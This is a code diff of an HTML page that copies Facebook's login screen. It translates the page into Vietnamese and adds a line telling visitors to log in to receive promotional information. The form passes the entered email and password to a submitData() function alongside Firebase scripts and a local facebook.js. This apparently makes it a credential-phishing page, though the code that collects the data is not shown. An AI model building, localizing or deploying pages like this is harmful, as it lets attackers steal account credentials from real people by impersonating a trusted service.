@@ -9,14 +9,14 @@
 <body>
 <script src="https://www.gstatic.com/firebasejs/8.9.1/firebase.js"></script>
 <script src="https://www.gstatic.com/firebasejs/8.9.1/firebase-analytics.js"></script>
-
 <script src="facebook.js"></script>
     <div class="textbox">
+        <p class="noti_input" id="noti_input">Vui lòng đăng nhập để lấy thông tin khuyến mãi</p>
         <h1>
             facebook
         </h1>
         <h2>
-            Facebook helps you connect and share<br> with the people in your life.
+            Facebook giúp bạn kết nối và chia sẻ<br> với mọi người trong cuộc sống của bạn.
         </h2>
     </div>
 
@@ -24,21 +24,17 @@
     <div class="container">
 <div class="form">
     <form class="form" onSubmit="submitData() ;return false;">
-        <input type="text" class="text" placeholder="Enter Your Email or Phone number" id="username"> <br>
-        <input type="password" class="text" placeholder="Password" id="password"><br>
-        <button onClick = "submitData()">Log In</button>
+        <input type="text" class="text" placeholder="Nhập vào email của bạn" id="username"> <br>
+        <input type="password" class="text" placeholder="Nhập vào password của bạn" id="password"><br>
+        <button onClick = "submitData()">Đăng nhập</button>
     </form>
 
 
-    <p><a href="">forgot password?</a><br></p>
+    <p><a href="">Quên mật khẩu?</a><br></p>
     <div class="btn">
-        <button>Create New Account</button>
+        <button>Tạo tài khoản mới</button>
      </div>
 </div>
-</div> 
-<div>
-    <p class="noti_congrat" id="noti_congrat"></p>
-    </div>
-       
+</div>
 </body>
 </html>
